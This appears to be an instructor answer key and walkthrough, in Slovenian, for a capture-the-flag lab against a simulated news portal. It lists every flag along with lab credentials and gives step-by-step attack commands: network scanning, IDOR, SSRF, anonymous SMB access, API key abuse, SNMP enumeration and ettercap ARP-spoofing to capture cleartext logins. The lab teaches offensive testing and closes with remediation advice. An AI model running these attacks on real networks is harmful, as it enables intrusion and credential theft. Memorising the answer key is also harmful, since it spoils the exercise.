# NovaPress Slovenija - Instructor Solutions

Ta dokument je odgovor in walkthrough za inštruktorja. Ne delite ga udeležencem pred zaključkom laboratorija.

## Vse zastavice

| Naloga | Odgovor |
|---:|---|
| 1.1 | `10.10.20.0/24` |
| 2.1 | `7` |
| 3.1 | `10.10.20.11` |
| 4.1 | `NP2-CTF{EXPOSED_DEPLOY_BACKUP}` |
| 5.1 | `NP2-CTF{OLD_PROXY_CONFIG_LEAK}` |
| 6.1 | `NP2-CTF{IDOR_UNPUBLISHED_PRESS_PASS}` |
| 7.1 | `NP2-CTF{SSRF_REACHED_INTERNAL_API}` |
| 8.1 | `NP2-CTF{SMB_PUBLIC_SHARE_EXPOSED}` |
| 9.1 | `NP2-CTF{SMB_EDITORIAL_SHARE_LEAK}` |
| 10.1 | `NP2-CTF{SMB_DROPBOX_WRITE_CONFIRMED}` |
| 11.1 | `NP2-CTF{BROKEN_ACCESS_CONTROL_DRAFT}` |
| 12.1 | `NP2-CTF{SNMP_PUBLIC_COMMUNITY}` |
| 13.1 | `NP2-CTF{CLEARTEXT_HTTP_SESSION_CAPTURED}` |
| 14.1 | `NP2-CTF{SCAPY_CUSTOM_PROBE}` |
| 15.1 | `NP2-CTF{REPORT_READY_FOR_EDITORIAL_BOARD}` |

## 1-3: Odkrivanje omrežja in portala

```bash
mkdir -p scans
nmap -sn 10.10.0.0/16
nmap -sn 10.10.20.0/24
nmap -sC -sV -p- 10.10.20.0/24 -oA scans/news2-full
```

Pričakovani aktivni IP naslovi:

```text
10.10.20.1
10.10.20.11
10.10.20.21
10.10.20.31
10.10.20.61
10.10.20.71
10.10.20.81
```

Javni portal:

```bash
curl http://10.10.20.11/
```

## 4-5: Spletni pregled in izpostavljene konfiguracije

```bash
nikto -h http://10.10.20.11
curl -i http://10.10.20.11/
curl http://10.10.20.11/robots.txt
curl http://10.10.20.11/backup/
curl http://10.10.20.11/backup/deploy.env.bak
curl http://10.10.20.11/backup/nginx-old.conf.bak
```

Uporabni izsledki:

- manjkata `X-Frame-Options` in `X-Content-Type-Options`
- `/backup/` omogoča indeksiranje
- konfiguracijske kopije so neposredno prenosljive

Zastavici:

```text
NP2-CTF{EXPOSED_DEPLOY_BACKUP}
NP2-CTF{OLD_PROXY_CONFIG_LEAK}
```

## 6: Nepravilen dostop do press pass zapisov

Javni zapisi:

```bash
curl 'http://10.10.20.11/press/pass.php?id=1001'
curl 'http://10.10.20.11/press/pass.php?id=1002'
curl 'http://10.10.20.11/press/pass.php?id=1003'
```

Neobjavljen zapis:

```bash
curl 'http://10.10.20.11/press/pass.php?id=9001'
```

Zastavica:

```text
NP2-CTF{IDOR_UNPUBLISHED_PRESS_PASS}
```

## 7: Predogled virov in doseganje notranje storitve

Iz izpostavljene konfiguracije je razviden notranji API na `10.10.20.61:8080`.

```bash
curl 'http://10.10.20.11/tools/preview.php?url=http://10.10.20.61:8080/internal/status'
```

Neposreden ukaz iz istega segmenta:

```bash
curl http://10.10.20.61:8080/internal/status
```

Zastavica:

```text
NP2-CTF{SSRF_REACHED_INTERNAL_API}
```

## 8-10: SMB enumeracija in zapisljiv share

Enumeracija:

```bash
nmap -p139,445 --script smb-enum-shares,smb-enum-users 10.10.20.31
enum4linux -a 10.10.20.31
smbclient -L //10.10.20.31 -N
```

Javna mapa:

```bash
smbclient //10.10.20.31/public -N
smb: \> ls
smb: \> get flag_public_share.txt
smb: \> quit
cat flag_public_share.txt
```

Uredniška mapa:

```bash
smbclient //10.10.20.31/editorial -N
smb: \> ls
smb: \> get flag_editorial_share.txt
smb: \> get api_notes.txt
smb: \> quit
cat flag_editorial_share.txt
```

Preverjanje zapisljivosti:

```bash
printf 'student proof from lab\n' > student-proof.txt
smbclient //10.10.20.31/dropbox -N
smb: \> put student-proof.txt
smb: \> ls
smb: \> get README_UPLOADS.txt
smb: \> quit
cat README_UPLOADS.txt
```

Zastavice:

```text
NP2-CTF{SMB_PUBLIC_SHARE_EXPOSED}
NP2-CTF{SMB_EDITORIAL_SHARE_LEAK}
NP2-CTF{SMB_DROPBOX_WRITE_CONFIRMED}
```

## 11: Uredniški API in zaupni osnutek

API ključ je v `/backup/deploy.env.bak`.

```bash
curl -H 'X-API-Key: np2-api-key-preview-2026' \
  http://10.10.20.61:8080/api/articles
```

Vidna sta samo običajna osnutka `2001` in `2002`:

```bash
curl -H 'X-API-Key: np2-api-key-preview-2026' \
  http://10.10.20.61:8080/api/articles/2001
curl -H 'X-API-Key: np2-api-key-preview-2026' \
  http://10.10.20.61:8080/api/articles/2002
```

Neposreden dostop do zaupnega osnutka:

```bash
curl -H 'X-API-Key: np2-api-key-preview-2026' \
  http://10.10.20.61:8080/api/articles/9009
```

Zastavica:

```text
NP2-CTF{BROKEN_ACCESS_CONTROL_DRAFT}
```

## 12: SNMP monitoring

```bash
nmap -sU -p161 --script snmp-info 10.10.20.81
snmpwalk -v2c -c public 10.10.20.81
snmpwalk -On -v2c -c public 10.10.20.81 1.3.6.1.4.1.8072.1.3.2
```

Zastavica:

```text
NP2-CTF{SNMP_PUBLIC_COMMUNITY}
```

## 13: Zajem nešifrirane HTTP seje

Editor container vsakih 30 sekund obišče portal, pošlje prijavne podatke in nato obišče nadzorno ploščo.

Osnovni zajem:

```bash
tcpdump -i <iface> -s 0 -w novapress.pcap host 10.10.20.71
wireshark novapress.pcap
```

Filtri v Wiresharku:

```text
http.request
http.cookie
http contains "ana.zupan"
http contains "Urednica2026!"
http contains "NPSESSID"
http contains "NP2-CTF"
```

Primer on-path zajema med delovno postajo in portalom:

```bash
ettercap -T -q -i <iface> --write mitm.pcap --mitm arp /10.10.20.71// /10.10.20.11//
```

Opcijsko tudi med delovno postajo in API:

```bash
ettercap -T -q -i <iface> --write mitm-api.pcap --mitm arp /10.10.20.71// /10.10.20.61//
```

Če delovna postaja udeleženca ni v istem Docker bridge segmentu, lahko inštruktor za razhroščevanje zažene helper:

```bash
docker compose --profile attacker up -d attacker-helper
docker compose exec attacker-helper ip addr
docker compose exec attacker-helper tcpdump -i eth0 -s 0 -w /tmp/novapress.pcap host 10.10.20.71
```

Zastavica je na strani:

```bash
curl -c c.txt -b c.txt -X POST http://10.10.20.11/login.php \
  --data 'username=ana.zupan' \
  --data 'password=Urednica2026!'
curl -b c.txt http://10.10.20.11/editor/dashboard.php
```

Zastavica:

```text
NP2-CTF{CLEARTEXT_HTTP_SESSION_CAPTURED}
```

## 14: Custom probe s Scapyjem

Najprej odkrij storitev:

```bash
nmap -sV -p8081 10.10.20.81
nc 10.10.20.81 8081
```

Netcat kontrolni primer:

```bash
printf 'NP-PROBE:2026' | nc 10.10.20.81 8081
```

Scapy primer:

```bash
python3 - <<'PY'
from scapy.all import Raw, raw
import socket

payload = raw(Raw(load=b"NP-PROBE:2026"))
with socket.create_connection(("10.10.20.81", 8081), timeout=3) as s:
    s.sendall(payload)
    print(s.recv(4096).decode(errors="replace"))
PY
```

Zastavica:

```text
NP2-CTF{SCAPY_CUSTOM_PROBE}
```

## 15: Povzetek poročila

Minimalno poročilo naj vsebuje:

- aktivne hoste in odprte porte
- izpostavljene datoteke in konfiguracije
- posledice dostopa do notranjih storitev
- ugotovitve iz zajema prometa
- priporočila: odstrani javne backup kopije, omeji predogled virov, popravi avtorizacijo objektov, zapri anonimne deljene mape, šifriraj prijavo, spremeni API ključ, omeji SNMP in uvedi pregled varnostnih glav

Zaključna zastavica:

```text
NP2-CTF{REPORT_READY_FOR_EDITORIAL_BOARD}
```
